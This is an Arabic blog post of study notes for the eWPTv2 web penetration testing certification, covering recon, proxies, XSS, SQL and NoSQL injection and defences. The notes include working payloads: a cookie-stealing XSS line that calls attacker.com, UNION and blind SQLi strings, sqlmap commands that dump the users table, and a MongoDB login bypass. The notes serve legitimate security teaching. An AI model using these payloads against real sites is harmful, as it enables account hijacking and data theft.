---
title: "eWPTv2 Study Notes"
published: 2026-09-07
description: "practical notes covering the eWPTv2 certification"
image: "eWPTv2.png"
tags:
  - "eWPTv2"
  - "Web Application Security"
  - "CMS Security"
  - "Web Security"
  - "Enumeration"
category: "Courses Notes"
lang: "ar"
---

نوتس Web Application Penetration Testing — دليل شامل خطوة بخطوة

بعد نوتس eJPTv2، حبيت أكمل بنوتس مخصصة لاختبار اختراق تطبيقات الويب بالتفصيل، لأن الجزء ده من أكتر الأجزاء اللي بتحتاج ممارسة عملية مكثفة، مش مجرد حفظ مفاهيم.

النوتس دي هتكون بالترتيب كالآتي:

 01- Introduction to Web Application Security Testing
 02- Information Gathering
 03- Web Proxies
 04- Cross-Site Scripting (XSS)
 05- SQL Injection
 06- Common Attacks
 07- File & Resource Attacks
 08- Web Services
 09- CMS Pentesting
 10- Encoding & Filtering
 11- API & JWT Security Testing
 12- SSRF, Insecure Deserialization, CORS & Clickjacking
 13- Business Logic & Rate Limiting
 ملحق: مرجع سريع (منافذ، Wordlists، أكواد HTTP، أدوات المتصفح)
 ملحق: قالب كتابة تقرير اختبار الاختراق
جدول المحتويات
01- Introduction to Web Application Security Testing
02- Information Gathering
03- Web Proxies
04- Cross-Site Scripting (XSS)
05- SQL Injection
06- Common Attacks
07- File & Resource Attacks
08- Web Services
09- CMS Pentesting
10- Encoding & Filtering
11- API & JWT Security Testing
12- SSRF وInsecure Deserialization وCORS وClickjacking
13- Business Logic & Rate Limiting
ملحق: مرجع سريع
ملحق: قالب تقرير

قبل أي حاجة، دي تجميعة لكل الأدوات اللي هتحتاجها في عملية البينتيست بتاعتك، ومعاها التثبيت السريع:

الأداة	الوصف	التثبيت
Burp Suite	تحليل واختبار أمان تطبيقات الويب	sudo apt update && sudo apt install burpsuite
OWASP ZAP	أداة مجانية ومفتوحة المصدر لاختبار أمان الويب	sudo apt update && sudo apt install zaproxy
Nikto	ماسح أمني للثغرات المعروفة في خدمات الويب	sudo apt update && sudo apt install nikto
SQLMap	أداة آلية لاكتشاف واستغلال ثغرات SQL Injection	sudo apt update && sudo apt install sqlmap
W3af	إطار عمل كامل لاختبار أمان تطبيقات الويب	sudo apt update && sudo apt install w3af
Metasploit Framework	تطوير الثغرات واختبارها	sudo apt update && sudo apt install metasploit-framework
Skipfish	ماسح أمان لتطبيقات الويب	sudo apt update && sudo apt install skipfish
Commix	اختبار ثغرات Command Injection	sudo apt update && sudo apt install commix
RIPS	تحليل الكود المصدري واكتشاف الثغرات	تحميل من الموقع الرسمي
XSStrike	اختبار ثغرات XSS	git clone https://github.com/s0md3v/XSStrike.git
AFL (American Fuzzy Lop)	أداة Fuzzing	sudo apt update && sudo apt install afl
Grendel-Scan	فحص أمان تطبيقات الويب	تحميل من الموقع الرسمي
Amass	استكشاف نطاقات فرعية وتخطيط سطح الهجوم بشكل شامل	sudo apt install amass
WPScan	فحص متخصص لمواقع WordPress	sudo apt install wpscan
ffuf	أداة Fuzzing سريعة جدًا للمسارات والباراميترات	go install github.com/ffuf/ffuf@latest

XSStrike تثبيت كامل:

bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt

ملاحظة تنظيمية: الأفضل إنك تعمل مجلد واحد مخصص للأدوات دي (زي ~/tools/) وتحط كل أداة متنزلة من GitHub جواه، بدل ما تتوزع في أماكن عشوائية على الجهاز — هيوفر عليك وقت كتير وقت ما تدور على أداة معينة بعد فترة.

01- Introduction to Web Application Security Testing

قبل ما تدخل في أي تفصيلة تقنية، لازم تكون فاهم الصورة الكبيرة: اختبار اختراق تطبيقات الويب هو محاولة منظمة لاكتشاف الثغرات في تطبيق ويب قبل ما حد يستغلها بنية سيئة. الفرق عن اختبار اختراق الشبكات إن التركيز هنا بيبقى على منطق التطبيق نفسه — إزاي بيتعامل مع المدخلات، إزاي بيدير الجلسات والمصادقة، وإزاي بيتفاعل مع قاعدة البيانات والملفات.

مرجع OWASP Top 10

قبل ما تبدأ أي اختبار، من المفيد جدًا إنك تكون عارف قائمة OWASP Top 10 — دي أخطر عشر فئات ثغرات في تطبيقات الويب حسب إحصائيات OWASP، ومعظم اللي هتقابله هنا بيقع تحت واحدة منهم:

الترتيب	الفئة
A01	Broken Access Control
A02	Cryptographic Failures
A03	Injection (SQLi, XSS, Command Injection...)
A04	Insecure Design
A05	Security Misconfiguration
A06	Vulnerable & Outdated Components
A07	Identification & Authentication Failures
A08	Software & Data Integrity Failures
A09	Security Logging & Monitoring Failures
A10	Server-Side Request Forgery (SSRF)

هنا هبدأ بمراجعة سريعة جدًا لأشهر الثغرات، وبعدين هفصّل كل واحدة منهم لاحقًا في السكاشن المخصصة ليها.

1. جمع المعلومات (Information Gathering)

ليه بنجمع معلومات؟

دي أول خطوة، عشان نفهم التطبيق اللي بنختبره، نعرف إيه التقنيات المستخدمة فيه، ونتعرف على نقاط ضعفه المحتملة.

أدوات نستخدمها:

Nmap: بيساعدك تعرف المنافذ المفتوحة على السيرفر
WHOIS Lookup: عشان تعرف معلومات عن المالك والمزود

مثال عملي:

لو عندك موقع اسمه Netriders.academy، ممكن تستخدم Nmap كده:

bash
nmap -sS Netriders.academy

ده هيظهرلك المنافذ المفتوحة والخدمات المتاحة على السيرفر.

2. التعرف على المكونات (Component Recognition)

إيه المكونات دي؟

دي المكتبات والإضافات المستخدمة في التطبيق. لو عرفتهم، ممكن تلاقي ثغرات معروفة فيهم.

أدوات نستخدمها:

Wappalyzer: إضافة للمتصفح بتقولك التقنيات المستخدمة في أي موقع
BuiltWith: موقع تاني مفيد لمعرفة التقنيات

مثال عملي:

ممكن تستخدم Wappalyzer على example.com وتشوف إذا كان فيه مكتبات معروفة زي jQuery أو أنظمة إدارة محتوى زي WordPress.

3. اختبار الثغرات الشائعة (مراجعة سريعة)

أ. SQL Injection

طريقة بتسمح لك تخترق قاعدة البيانات من خلال إدخال بيانات خبيثة. مثال:

text
http://example.com/login.php?user=admin' OR '1'='1' -- &pass=12345

لو دخلت، يبقى فيه ثغرة SQL Injection.

ب. Cross-Site Scripting (XSS)

إنك تحط كود JavaScript ضار في التطبيق. مثال:

html
<!-- <script>alert('XSS Attack');</script> -->

(الكود متعمد تحويله لكومنت هنا عشان ميتنفذش لو اتفتح في متصفح بالغلط — لكن في الاختبار الفعلي بتشيل علامات الكومنت وتحقن الكود زي ما هو).

لو ظهرت الرسالة، التطبيق معرض لهجوم XSS.

ج. Cross-Site Request Forgery (CSRF)

إنك تخلي المستخدم ينفذ عمليات بدون ما يعرف، زي تغيير كلمة السر. مثال:

text
http://example.com/change-password?newpass=12345

لو المستخدم ضغط على الرابط، هتتغير كلمة السر من غير ما يعرف.

4. تحليل الاستجابة (Response Analysis)

ليه بنحلل الاستجابة؟

عشان نعرف إزاي التطبيق بيستجيب للأوامر. لو فيه معلومات حساسة أو أخطاء مفيدة، ده هيساعدنا نكتشف الثغرات.

أدوات نستخدمها: Burp Suite، OWASP ZAP لالتقاط وتحليل الطلبات والردود.

5. تقرير النتائج (Reporting)

عناصر التقرير الأساسية:

الوصف: تفاصيل الثغرة وأثرها
خطوات الإصلاح: إزاي نصلح الثغرة
الأهمية: مدى خطورة الثغرة، ويفضل تحديدها برقم CVSS لو ممكن

مثال: لو اكتشفت SQL Injection، تكتب: "في ثغرة SQL Injection في نموذج تسجيل الدخول" مع توصية "استخدم الاستعلامات المحضرة (Prepared Statements) بدل الاستعلامات الديناميكية".

دي كانت مراجعة سريعة جدًا لبعض الثغرات، ممكن تتخطاها بدون مشكلة لو عايز تروح على طول للتفاصيل الكاملة تحت.

02- Information Gathering (بالتفصيل)

السكشن ده هنعيد فيه اللي اتشرح فوق، لكن بتفاصيل أكتر شوية، وبيغطي:

Finding Website Ownership & IP Addresses
Reviewing Webserver Metafiles For Information Leakage
Search Engine Discovery
Web App Fingerprinting
Source Code Analysis
Website Crawling & Spidering
Web Server Fingerprinting
DNS Enumeration
Subdomain Enumeration
Web App Vulnerability Scanning
Automated Recon Frameworks
مقدمة

جمع المعلومات عن المواقع هي أول خطوة في أي اختبار اختراق. الهدف إنك تجمع كل حاجة تقدر عليها عن الموقع المستهدف عشان تحدد نقاط الضعف اللي ممكن تستغلها.

Passive vs Active — إيه الفرق عمليًا؟
النوع	طبيعته	أمثلة	فرصة الاكتشاف
Passive	من غير أي تفاعل مباشر مع الهدف	WHOIS، Google Dorking، Shodan، سجلات DNS العامة	شبه معدومة
Active	تفاعل مباشر مع أنظمة الهدف	Port Scanning، Directory Brute-forcing، Banner Grabbing	موجودة، وبتزيد كل ما زاد عدد الطلبات

القاعدة العملية: ابدأ دايمًا بالـ Passive لحد ما تجمع أكبر قدر من المعلومات، وبعدين انتقل للـ Active بعد ما تكون عارف حدود الـ Scope بدقة.

إزاي تعرف ملكية الموقع وعناوين الـ IP
WHOIS: بيعرفك مين صاحب النطاق، الاسم، البريد الإلكتروني، وأحيانًا العنوان. تقدر تستخدم whois.domaintools.com
DNS Lookup: أدوات زي nslookup أو dig بتعرفك عنوان الـ IP بتاع الموقع من اسم النطاق
bash
dig example.com A
dig example.com MX
مراجعة ملفات الميتا عشان تعرف معلومات مسربة
ملفات زي robots.txt وhumans.txt بتبقى فيها أحيانًا معلومات مهمة بتكشف مسارات أو ملفات مش مفروض تكون ظاهرة للعامة
sitemap.xml: بيبقى عشان محركات البحث تفهرس الموقع، وأحيانًا بيكون فيه مسارات لصفحات مش ظاهرة للمستخدم العادي
البحث عن المعلومات باستخدام محركات البحث

Google Dorking — أوامر بحث متقدمة في جوجل لجلب معلومات حساسة:

text
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"
site:example.com ext:sql | ext:env | ext:log
site:example.com inurl:wp-content

Shodan — نفس الفكرة بس على مستوى الأجهزة المتصلة بالإنترنت مباشرة:

text
org:"Example Company"
hostname:example.com

الصفحات المؤرشفة: جوجل بيحتفظ بنسخ من الصفحات القديمة، وموقع web.archive.org (Wayback Machine) بيحتفظ بنسخ تاريخية كاملة من الموقع، أحيانًا تلاقي فيها معلومات اتحذفت من الموقع الحالي.

بصمة تطبيق الويب
HTTP Headers: الرد اللي بييجي بعد أي طلب ممكن يحتوي على معلومات عن نوع السيرفر وإصداره. أدوات زي Wappalyzer وBuiltWith بتحدد لك الأدوات المستخدمة
صفحات الأخطاء (404): أحيانًا بتوضح نوع الخادم أو التطبيقات المستخدمة
تحليل الشيفرة المصدرية للموقع
عرض الكود المصدري: ممكن تلاقي تعليقات أو نصوص مخفية فيها معلومات مفيدة
GitLeaks: لاكتشاف أي تسريبات بيانات في مستودعات الكود زي Git
الزحف والتجسس على الموقع
OWASP ZAP و Burp Suite: بتعمل فحص شامل للموقع وتجيب كل الروابط والصفحات
Spiders: بتزحف عبر الموقع وتتبع الروابط كلها عشان تجمع معلومات عن هيكل الموقع
تحديد بصمة الخادم
Nmap: لتحديد إصدار الخادم ونظام التشغيل، والمنافذ المفتوحة، ونوع الخادم (Apache، IIS...)
Banner Grabbing: استخلاص معلومات عن الخادم من الرد اللي بييجي من الشبكة
bash
nc -nv example.com 80
HEAD / HTTP/1.1
Host: example.com
استكشاف DNS
dnsenum: لمعرفة كل سجلات DNS زي عناوين الـ IP والخوادم الداخلية
Reverse DNS Lookup: لمعرفة النطاقات المرتبطة بعنوان IP معين
استكشاف النطاقات الفرعية
Sublist3r و Amass: للدوران على النطاقات الفرعية المرتبطة بالنطاق الرئيسي — النطاقات دي ممكن تكون فيها تطبيقات غير مؤمنة كويس
Brute-force Subdomains: تقنيات لتجربة أسماء نطاقات فرعية محتملة
bash
amass enum -d example.com

مثال عملي: الموقع الرئيسي example.com كان مؤمن كويس ومعمول عليه WAF قوي، لكن Amass طلع لي نطاق فرعي old-portal.example.com مكانش موجود في أي مكان ظاهر في الموقع الرئيسي — واتضح إنه نسخة تجريبية قديمة من التطبيق، منسي، وشغال بإعدادات افتراضية وبدون أي حماية. النطاقات الفرعية المنسية دي غالبًا بتبقى أسهل نقطة دخول.

فحص ثغرات تطبيقات الويب
Nikto و Acunetix: فحص شامل للموقع عن ثغرات معروفة زي XSS وSQL Injection
Fuzzing: إرسال بيانات عشوائية أو معدلة للموقع ومراقبة استجابة السيرفر لاكتشاف الثغرات
أطر العمل الآلية للتجسس
Recon-ng: إطار عمل مفتوح المصدر بيجمع المعلومات من مصادر كتير وبينظمها
SpiderFoot: أداة آلية بتجمع معلومات من محركات البحث وسجلات DNS وبتحلل الروابط بين البيانات
03- Web Proxies

السكشن ده بيغطي:

Introduction To Burp Suite & OWASP ZAP
Configuring The Burp Proxy
Burp Suite Dashboard & UI
Burp Suite Target, Intruder, Sequencer, Repeater & Decoder
Configuring The OWASP ZAP Proxy & Browser Certificate
OWASP ZAP Dashboard & UI
Crawling & Spidering With OWASP ZAP
OWASP ZAP Target Context
Directory Enumeration With ZAP & Burp
Attacking HTTP Forms With ZAP & Burp
مقدمة عن البروكسيات

البروكسيات بتساعدك تشوف كل الترافيك اللي بيعدي بين المتصفح والخادم وتعدله لو حابب. يعني، لما تدخل على موقع، تقدر تشوف كل الطلبات والاستجابات اللي بتتبعت للموقع، وتقدر تعدل فيها قبل ما توصل. الأدوات دي مهمة جدًا عشان تكتشف ثغرات زي SQL Injection وXSS.

Burp Suite مقابل OWASP ZAP — إيه الفرق عمليًا؟
المعيار	Burp Suite	OWASP ZAP
التكلفة	Community مجانية بميزات محدودة، Pro مدفوعة	مجانية بالكامل ومفتوحة المصدر
سهولة الاستخدام للمبتدئين	متوسطة	أسهل شوية
قوة الأتمتة	ممتازة في النسخة Pro	جيدة جدًا وبتتحسن باستمرار
الأنسب لـ	الاستخدام الاحترافي والمكثف	البداية والتعلم والمشاريع مفتوحة المصدر
إعداد بروكسي Burp

لما تفتح Burp، هتلاقي في Proxy Tab إعدادات تشغيل البروكسي. بعدها تروح للمتصفح وتعدل إعدادات الشبكة عشان الترافيك يعدي من خلال Burp. العنوان هيبقى 127.0.0.1 والبورت غالبًا 8080.

لوحة التحكم والواجهة في Burp Suite
التاب	الوظيفة
Dashboard	ملخص عن كل الفحصات والهجمات الشغالة
Target	تحديد الموقع اللي عايز تفحصه
Proxy	مشاهدة الطلبات اللي بتتبعت وتعديلها
Intruder	هجمات زي Brute Force أو اختبار مدخلات مختلفة
Repeater	إرسال نفس الطلب مرة ورا التانية مع تعديلات صغيرة
Sequencer	تحليل مدى قوة الرموز (Tokens) المستخدمة في الجلسات
Decoder	فك أو تشفير البيانات
أنواع الهجوم في Intruder

الـ Intruder فيه 4 أنماط هجوم مختلفة، والفرق بينهم مهم جدًا تفهمه:

النمط	طريقة عمله	استخدام مناسب
Sniper	يجرب كل قيمة على نقطة واحدة بالتبادل	اختبار باراميتر واحد بقايمة قيم
Battering Ram	نفس القيمة على كل النقاط في نفس الوقت	تجربة نفس الـ Payload في أكتر من مكان مع بعض
Pitchfork	قيم مختلفة متزامنة من قوائم متعددة	تجربة زوج Username/Password من قائمتين مرتبطتين
Cluster Bomb	كل التوافيقات الممكنة بين القوائم	Brute Force شامل لأكتر من باراميتر مع بعض
إعداد بروكسي OWASP ZAP وشهادة المتصفح

في Options بتضبط إعدادات البروكسي (نفس العنوان والبورت زي Burp غالبًا). عشان تقدر تتجسس على مواقع HTTPS، لازم تضيف شهادة ZAP للمتصفح — هتلاقيها في ZAP's Root CA، وبتضيفها في إعدادات أمان المتصفح.

لوحة التحكم والواجهة في OWASP ZAP
التاب	الوظيفة
Dashboard	ملخص عن الفحصات والثغرات المكتشفة
Sites	المواقع اللي اشتغلت عليها مرتبة حسب الدومين
History	كل الطلبات اللي عدت من خلال ZAP
Active Scan	فحص شامل للموقع عن ثغرات
Spider	زحف على الموقع لجمع كل الصفحات والروابط
الزحف والتجسس باستخدام OWASP ZAP

في Spider Tab، تبدأ الزحف على الموقع وتجمع كل الروابط والصفحات الموجودة، وبعد كده تبدأ Active Scan عشان تدور على ثغرات في الصفحات اللي جمعتها.

إعداد الهدف في OWASP ZAP (Target Context)

في ZAP تقدر تعمل Context للموقع اللي بتفحصه — إعدادات مخصصة لتحديد صفحات معينة أو مسارات حساسة.

استكشاف الأدلة (Directory Enumeration) باستخدام ZAP و Burp

هو إنك تدور على مجلدات أو ملفات مخفية في الموقع. أدوات زي Intruder في Burp أو Forced Browse في ZAP بتجرب أسماء مشهورة زي /admin أو /backup عشان تشوف لو فيه ملفات مخفية ممكن تدخل عليها.

مهاجمة النماذج باستخدام ZAP و Burp
في Burp، باستخدام Intruder تبعت طلبات كتير لنموذج زي صفحة تسجيل دخول، وتجرب كلمات مرور مختلفة
في ZAP، تستخدم Fuzzer أو Active Scan للهجوم على النماذج وتجربة مدخلات مختلفة لاكتشاف الثغرات
04- Cross-Site Scripting (XSS)

السكشن ده بيغطي:

Types of Cross-Site Scripting Attacks
Anatomy of a Cross-Site Scripting Attack
Introduction To Reflected XSS
Identifying & Exploiting Reflected XSS Vulnerabilities
Introduction To Stored XSS
Identifying & Exploiting Stored XSS Vulnerabilities
Introduction To DOM-Based XSS
Identifying & Exploiting DOM-Based XSS Vulnerabilities
Identifying & Exploiting XSS Vulnerabilities with automated tools
مقدمة

ثغرة XSS هي واحدة من أشهر الثغرات في تطبيقات الويب، بتسمح للمهاجم إنه يحقن أكواد ضارة (زي JavaScript) في صفحات الويب اللي بيشوفها المستخدمين. الهدف الرئيسي إن المهاجم يتحكم في متصفح الضحية ويستخدم صلاحياته — زي الوصول للكوكيز، الجلسات، أو تنفيذ أكواد على المتصفح.

إيه اللي المهاجم يقدر يعمله فعليًا بعد نجاح XSS؟
التأثير	الشرح
سرقة الجلسة (Session Hijacking)	سرقة الكوكيز واستخدامها للدخول كضحية
Keylogging	تسجيل كل ضغطة كيبورد للضحية على الصفحة
Defacement	تغيير شكل الصفحة اللي شايفها الضحية
Phishing داخل الصفحة نفسها	عرض نموذج تسجيل دخول وهمي فوق الصفحة الحقيقية
تنفيذ أوامر بالنيابة عن الضحية	زي تغيير إيميله أو باسورده من غير ما يحس
أنواع هجمات XSS

1. Reflected XSS

بيحصل لما الموقع يعكس (reflect) البيانات اللي دخلها المستخدم في الرد على نفس الطلب، وده بيكون غالبًا في الـ URL.

2. Stored XSS

بيحصل لما المهاجم يحقن الأكواد الضارة في قاعدة بيانات الموقع أو مكان تخزين دائم، والأكواد دي بتتنفذ لما مستخدمين تانيين يفتحوا الصفحة — وده أخطر من الـ Reflected لأنه بيأثر على كل زوار الصفحة، مش المهاجم بس.

3. DOM-Based XSS

الأكواد الضارة بتتنفذ على مستوى المتصفح بسبب تعديل الـ DOM (Document Object Model) من غير ما يمر الطلب على الخادم أصلًا — يعني المشكلة كلها في الجافاسكريبت اللي شغال على المتصفح، مش في السيرفر.

تشريح هجوم XSS
الخطوة الأولى: المهاجم بيدور على مدخل (input) زي نموذج تسجيل أو حقل بحث يقبل بيانات من المستخدم
الخطوة الثانية: المهاجم بيدخل كود JavaScript ضار في المدخل ده
الخطوة الثالثة: الموقع بيرجع الكود الضار للمستخدمين التانيين (Stored XSS) أو للمهاجم نفسه (Reflected XSS) من غير فحص أو ترشيح
الخطوة الرابعة: الأكواد بتتنفذ في متصفح الضحية، ويحصل اللي المهاجم كان مخططه — سرقة بيانات أو تنفيذ أوامر على المتصفح
Reflected XSS بالتفصيل

بيحصل لما المهاجم يحقن كود ضار في المدخلات اللي بتتعكس في الرد على الطلب مباشرة، زي حقول البحث أو الروابط اللي فيها معلمات (parameters) زي ?search=query.

التعرف على واستغلال Reflected XSS:

تدور على مدخلات في الموقع زي نماذج أو معلمات URL بتقبل أي نوع من البيانات
تحاول تحقن كود JavaScript في المدخل ده وتشوف لو الموقع هيعكس الكود ده في الرد

مثال عملي:

text
http://example.com/search?query=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E

(الرابط ده مكتوب بترميز URL Encoding عمدًا عشان ميتنفذش لو اتنسخ لمتصفح بالغلط — في الاختبار الفعلي بتحقن الكود الخام زي: <script>alert(document.cookie)</script>)

لو ظهر Alert فيه قيمة الكوكيز، يبقى فيه ثغرة Reflected XSS فعلية، وده معناه إن المهاجم يقدر يسرق جلسة المستخدم لو خدعه يدوس على رابط مشابه.

Stored XSS بالتفصيل

مثال عملي: لو فيه صفحة تعليقات في مدونة، وحطيت في خانة التعليق:

html
<!-- <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script> -->

(نفس الملاحظة السابقة — الكومنت هنا لمنع التنفيذ العرضي، وفي الاختبار الفعلي بتشيله وتحقن الكود زي ما هو).

ولو الموقع خزّن التعليق ده وعرضه لكل الزوار من غير تنقية، كل زائر يفتح الصفحة كوكيز جلسته هتتبعت تلقائيًا للمهاجم.

DOM-Based XSS بالتفصيل

مثال عملي: لو الموقع بياخد قيمة من الـ URL Fragment (اللي بعد #) ويحطها مباشرة في الصفحة بجافاسكريبت زي:

javascript
document.getElementById("welcome").innerHTML = location.hash.substring(1);

فتقدر تحقن:

text
http://example.com/page.html#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

(نفس فكرة الترميز السابقة — الشكل الخام اللي بتحقنه فعليًا هو: <img src=x onerror=alert(1)>)

المشكلة هنا إن السيرفر أصلًا مش شايف حاجة، الترميز اللي بعد # مبيتبعتش للسيرفر، فالفحص لازم يركز على الكود اللي شغال في المتصفح مش على الردود بتاعة السيرفر.

الاكتشاف الآلي لثغرات XSS

XSStrike أداة متخصصة في اكتشاف واستغلال ثغرات XSS بشكل آلي:

bash
python3 xsstrike.py -u "http://example.com/search?query=test"

كمان Burp Suite Scanner وOWASP ZAP Active Scan بيقدروا يكتشفوا XSS بشكل آلي أثناء فحصهم الشامل للموقع.

طرق الحماية من XSS (مهم تعرفها كمان لو بتكتب تقرير)
Output Encoding: ترميز أي بيانات جاية من المستخدم قبل عرضها في الصفحة
Content Security Policy (CSP): رأس HTTP بيحدد مصادر التحميل المسموحة للسكريبتات، وبيمنع تنفيذ Inline Scripts افتراضيًا
HttpOnly Cookies: يمنع الجافاسكريبت من الوصول للكوكيز حتى لو حصل XSS فعلي
مكتبات تنقية موثوقة: زي DOMPurify بدل محاولة كتابة فلتر تنقية يدوي بنفسك
05- SQL Injection

السكشن ده بيغطي:

Types of SQL Injection Vulnerabilities
Introduction to Databases, DBMS, Relational Databases and NoSQL Databases
SQL Fundamentals
Hunting for SQL Injection Vulnerabilities
Identifying & Exploiting In-Band SQL Injection Vulnerabilities (Error-Based SQLi & UNION-Based SQLi)
Identifying & Exploiting Blind SQL Injection Vulnerabilities (Time-Based SQLi & Boolean-Based SQLi)
Identifying & Exploiting SQLi vulnerabilities with automated tools like SQLMap
Pentesting NoSQL Database
مقدمة

ثغرة SQL Injection من أخطر الثغرات الأمنية في تطبيقات الويب، لأنها بتسمح للمهاجم إنه يتلاعب بقاعدة البيانات اللي ورا التطبيق من خلال إدخال أكواد SQL ضارة في المدخلات. الهدف الأساسي هو الوصول لبيانات حساسة أو تنفيذ أوامر غير مصرح بها على قاعدة البيانات.

أنواع ثغرات SQL Injection
In-Band SQLi: المهاجم بيحصل على النتائج مباشرة في نفس القناة اللي أرسل فيها الطلب. أشهر أشكاله Error-Based SQLi وUNION-Based SQLi
Blind SQLi: مفيش رد مباشر من قاعدة البيانات، لكن المهاجم بيعتمد على تغيير سلوك التطبيق عشان يستنتج البيانات. أشهر أنواعه Boolean-Based SQLi وTime-Based SQLi
Out-of-Band SQLi: المهاجم بيستخدم قنوات خارجية عشان يحصل على الردود، زي إرسال النتائج لعنوان خارجي
مقدمة عن قواعد البيانات والـ DBMS
قواعد البيانات (Databases): المكان اللي بيتم فيه تخزين البيانات بشكل منظم لتسهيل استرجاعها
DBMS: الأنظمة اللي بتسمح لك بالتفاعل مع قواعد البيانات، زي MySQL وPostgreSQL وOracle
قواعد بيانات علائقية (Relational): بتعتمد على جداول مترابطة، زي MySQL وPostgreSQL
قواعد بيانات غير علائقية (NoSQL): مبتعتمدش على الجداول، بتخزن البيانات بشكل غير منظم، زي MongoDB وCouchDB
أساسيات SQL

أوامر SQL الأساسية:

SELECT: لاسترجاع البيانات
INSERT: لإضافة بيانات جديدة
UPDATE: لتعديل البيانات
DELETE: لحذف البيانات
البحث عن ثغرات SQL Injection
تدور على مدخلات في التطبيق زي حقول البحث أو نماذج تسجيل الدخول اللي بتتفاعل مع قاعدة البيانات
تحاول تحقن كود SQL بسيط زي ' OR '1'='1 وتشوف لو التطبيق بيستجيب بنتائج غير متوقعة
تستخدم أدوات زي Burp Suite لإرسال الطلبات وتعديل المدخلات لاكتشاف الثغرات
اختلاف صيغة الحقن حسب نوع قاعدة البيانات

نفس فكرة SQL Injection، لكن الصياغة بتختلف شوية حسب نوع الـ DBMS، ومهم تعرف الفرق ده عشان تعرف تتعامل مع أي نظام تقابله:

قاعدة البيانات	رمز التعليق	مثال استخراج نسخة قاعدة البيانات
MySQL	-- أو #	UNION SELECT @@version --
Microsoft SQL Server	--	UNION SELECT @@version --
PostgreSQL	--	UNION SELECT version() --
Oracle	--	UNION SELECT banner FROM v$version --
In-Band SQLi (Error-Based & UNION-Based)

Error-Based SQLi: المهاجم بيستغل أخطاء قاعدة البيانات اللي بتظهر في الردود عشان يستخرج معلومات.

UNION-Based SQLi — مثال:

sql
' UNION SELECT username, password FROM users --

قبل ما تستخدم UNION، لازم تعرف عدد الأعمدة في الاستعلام الأصلي، وده بتعرفه بتجربة:

sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

لحد ما ترجعلك رسالة خطأ — الرقم اللي قبله يبقى هو عدد الأعمدة الصحيح.

Blind SQLi (Boolean-Based & Time-Based)

Boolean-Based SQLi: بتعتمد على تغيير سلوك التطبيق بناءً على استعلام صحيح أو خطأ:

sql
' AND 1=1 --

لو التطبيق اشتغل زي ما هو، جرب:

sql
' AND 1=2 --

لو حصل تغيير في السلوك (اختفاء بيانات كانت ظاهرة قبل كده مثلًا)، يبقى فيه ثغرة.

Time-Based SQLi: بتستخدم أوامر تأخير الوقت عشان تستنتج البيانات بناءً على وقت الاستجابة:

sql
' OR IF(1=1, SLEEP(5), 0) --

لو الصفحة أخدت 5 ثواني إضافية عشان ترد، يبقى الشرط بيتنفذ فعليًا جوا قاعدة البيانات.

الاكتشاف والاستغلال الآلي بـ SQLMap
bash
sqlmap -u "http://site.com/page?id=1"

مثال عملي متكامل:

bash
sqlmap -u "http://site.com/page?id=1" --dbs
sqlmap -u "http://site.com/page?id=1" -D webapp_db --tables
sqlmap -u "http://site.com/page?id=1" -D webapp_db -T users --dump

الأوامر دي بترجع قواعد البيانات، بعدها الجداول، وفي الآخر البيانات نفسها.

أهم فلاجز SQLMap اللي هتحتاجها كتير:

الفلاج	الوظيفة
--dbs	عرض كل قواعد البيانات
-D <name> --tables	عرض جداول قاعدة بيانات معينة
-T <name> --columns	عرض أعمدة جدول معين
--dump	استخراج البيانات فعليًا
--os-shell	محاولة الحصول على Shell على السيرفر لو الصلاحيات سمحت
--risk 3 --level 5	زيادة عمق الفحص وأنواع الحقن المجربة (أبطأ لكن أشمل)
اختبار اختراق قواعد بيانات NoSQL

قواعد بيانات NoSQL مختلفة في البنية وطريقة استغلال الثغرات مقارنة بالعلائقية — الهجمات فيها بتعتمد على أكواد زي JavaScript بدل SQL. لو قاعدة البيانات بتستخدم MongoDB، ممكن تحقن:

json
{"$ne": null}

كمثال، لو حقل الباسورد في طلب تسجيل الدخول بيقبل JSON، إدخال {"$ne": null} بدل الباسورد الحقيقي ممكن يخلي الاستعلام يرجع "صح" لأي مستخدم موجود، لأن المقارنة بقت "الباسورد لا يساوي null" بدل مطابقة القيمة الفعلية.

طرق الحماية من SQL Injection
Prepared Statements / Parameterized Queries: أهم وأقوى حماية على الإطلاق
ORM Frameworks: زي Hibernate أو Sequelize بتقلل الحقن المباشر بطبيعتها
Least Privilege: حساب قاعدة البيانات المستخدم في التطبيق ميكونش عنده صلاحيات إدارية غير محتاجها
WAF: كطبقة حماية إضافية، مش بديل عن الحماية الصحيحة في الكود
06- Common Attacks

السكشن ده بيغطي:

HTTP Method & Authentication Testing
Sensitive Data Exposure
Broken Authentication Attacks
Session Security Testing (Session Hijacking, Session Fixation & CSRF)
Injection & Input Validation Attacks (Command Injection, Code Injection)
Testing For Security Misconfigurations
Exploiting Vulnerable & Outdated Components
اختبار طرق HTTP والمصادقة

طرق HTTP: بتعمل اختبار على الطرق المختلفة زي GET, POST, PUT, DELETE، عشان تشوف لو فيه ثغرات. ساعات السيرفرات بتكون مش متأمنة كويس وبتسمح بطرق زي DELETE لناس مش مفروض يكون عندهم صلاحيات.

bash
curl -X OPTIONS http://example.com -i

الأمر ده بيوريك كل الطرق المسموحة على الرابط، وده أول خطوة منطقية قبل ما تجرب أي طريقة يدويًا.

اختبار المصادقة: بتشوف إزاي الموقع بيعمل تسجيل دخول للمستخدمين، لو فيه تشفير قوي، ولو بيدير الأخطاء بطريقة صح. بتدور على تخمين الباسوردات، كلمات مرور ضعيفة، أو غياب المصادقة متعددة العوامل (MFA).

تعريض البيانات الحساسة (Sensitive Data Exposure)

بتحصل لما الموقع يكشف بيانات حساسة زي معلومات شخصية، أرقام كروت ائتمان، أو بيانات صحية.

الاختبار: تتأكد إن البيانات متشفرة سواء وهي بتتنقل أو محفوظة، وتستخدم Burp Suite للتأكد إن البيانات الحساسة مش بتتبعت عبر HTTP العادي، وإن فيه رؤوس أمان زي Strict-Transport-Security.

أهم رؤوس الأمان اللي لازم تتأكد من وجودها:

الرأس	الوظيفة
Strict-Transport-Security	يجبر المتصفح يستخدم HTTPS بس
Content-Security-Policy	يحدد مصادر تحميل المحتوى المسموحة
X-Frame-Options	يمنع تحميل الصفحة جوا iframe (حماية من Clickjacking)
